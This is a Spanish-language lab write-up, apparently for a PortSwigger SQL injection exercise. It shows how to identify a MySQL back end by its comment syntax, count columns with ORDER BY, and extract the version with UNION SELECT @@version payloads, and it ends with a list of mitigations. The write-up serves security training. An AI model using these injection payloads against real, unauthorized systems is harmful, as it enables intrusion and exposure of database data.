---
title: "Ataque de inyección SQL, consultando el tipo y versión de la base de datos en MySQL y Microsoft"
platform: "PortSwigger"
os: "Windows"
difficulty: "Easy"
ip: "10.10.10.XXX"
slug: "ataque-de-inyeccion-sql-consultando-el-tipo-y-version-de-la-base-de-datos-en-mysql-y-microsoft"
author: "Z4k7"
date: "2026-03-27"
year: "2026"
status: "pwned"
tags:
  - "sqli"
  - "web"
  - "union"
  - "mysql"
  - "apprentice"
techniques:
  - "SQL Injection"
  - "UNION attack"
  - "fingerprint MySQL"
  - "comentario #"
  - "@@version"
tools:
  - "BurpSuite"
flags_list:
  - label: "Lab resuelto"
    value: "Versión MySQL visible en la respuesta ✓"
summary: "La vulnerabilidad de SQL Injection en el filtro de categorías permite extraer la versión del motor MySQL usando @@version. La particularidad crítica: MySQL acepta # como comentario de una sola línea — esto sirve como fingerprint del motor. Cadena de ataque: detección con '# → confirma MySQL → ORDER BY (2 columnas) → UNION NULL,NULL# → UNION SELECT @@version,NULL#.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Prueba inicial con comentarios para fingerprint del motor:
      - kind: "code"
        lang: "SQL"
        code: |
          '--   → Error esperado
          '#    → Comentario válido en MySQL ✓
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El uso de `'#` confirma que el motor es MySQL, ya que acepta este tipo de comentario."
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20consultando%20el%20tipo%20y%20versi%C3%B3n%20de%20la%20base%20de%20datos%20en%20MySQL%20y%20Microsoft/file-20260310095759359.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La captura muestra el uso de BurpSuite para interceptar y modificar las peticiones, evitando recargar manualmente la web."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El fingerprint del motor mediante el tipo de comentario es elegante y silencioso. Resumen rápido: - `#` funciona → MySQL - `--` funciona sin espacio → Oracle / MSSQL / PostgreSQL - `-- ` (con espacio) necesario → MySQL estricto - Todo UNION necesita `FROM dual` → Oracle  Identificar el motor en reconocimiento te ahorra tiempo en cada paso siguiente."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "bullet"
        text: "Punto de inyección: parámetro category en la URL"
      - kind: "bullet"
        text: "Motor de BD: MySQL (confirmado por aceptación de #)"
      - kind: "bullet"
        text: "Comentario a usar: # en todos los payloads siguientes"
      - kind: "bullet"
        text: "Objetivo: determinar número de columnas y extraer @@version"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Una vez confirmado MySQL, usa `#` consistentemente en todos los payloads. Mezclar `--` y `#` puede causar falsos negativos y hacerte pensar que no hay SQLi cuando sí la hay."

  - id: "enum"
    num: "03"
    title: "Paso 1 — Determinar columnas con ORDER BY"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          '+ORDER+BY+1,2#   → Éxito
          '+ORDER+BY+1,2,3# → Error
      - kind: "note"
        text: |
          El error al ordenar por la columna 3 indica 2 columnas.
      - kind: "image"
        src: "assets/images/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle/file-20260310093350786.jpg"
        caption: "Evidencia técnica"

  - id: "exploit"
    num: "04"
    title: "Paso 2 — Validar con UNION SELECT"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT NULL#         → Error
          ' UNION SELECT NULL,NULL#    → Éxito ✓
          ' UNION SELECT NULL,NULL,NULL# → Error
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20consultando%20el%20tipo%20y%20versi%C3%B3n%20de%20la%20base%20de%20datos%20en%20MySQL%20y%20Microsoft/file-20260310100037122.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La consulta exitosa con 2 columnas confirma la estructura de la tabla subyacente."

  - id: "step5_1"
    num: "05"
    title: "Paso 3 — Extraer versión de la base de datos"
    content:
      - kind: "note"
        text: |
          Referencia: [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT @@version,NULL#
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20consultando%20el%20tipo%20y%20versi%C3%B3n%20de%20la%20base%20de%20datos%20en%20MySQL%20y%20Microsoft/file-20260310100206746.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La inyección muestra la cadena de versión de MySQL en la respuesta del servidor."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "`@@version` es la variable de sistema en MySQL y MSSQL que contiene la versión completa del motor. La versión exacta te dice qué exploits adicionales podrían aplicar — MySQL 5.x vs 8.x tienen diferencias importantes en permisos y funciones disponibles."

  - id: "exploit"
    num: "06"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Lab de tipo "fingerprint de BD" — no requiere acceso a cuenta. El objetivo es mostrar la cadena de versión de MySQL.

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "Lab resuelto"
        value: "Versión MySQL visible en la respuesta ✓"

  - id: "privesc_1"
    num: "07"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          No aplica — lab de identificación de motor de BD.

  - id: "step8_1"
    num: "08"
    title: "Consulta del tipo y la versión de la base de datos"
    content:
      - kind: "table"
        headers:
          - "Tipo de base de datos"
          - "Consulta"
        rows:
          - ["Microsoft, MySQL", "`SELECT @@version`"]
          - ["Oracle", "`SELECT banner FROM v$version`"]
          - ["PostgreSQL", "`SELECT version()`"]
      - kind: "callout"
        type: "danger"
        label: "SQL ERROR esperado al probar columnas"
        text: "All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists."

lessons:
  - 'Siempre identificar el número de columnas primero.'
  - 'Usar `NULL` como placeholder en UNION SELECT.'
  - 'Conocer atributos específicos del motor: `@@version` en MySQL/MSSQL, `banner` en Oracle, `version()` en PostgreSQL.'
mitigation:
  - 'Implementar consultas parametrizadas (Prepared Statements).'
  - 'Escapar y validar entradas de usuario.'
  - 'Configurar WAF para detectar patrones de inyección `UNION`, `ORDER BY`.'
  - 'Minimizar mensajes de error expuestos al cliente.'
---
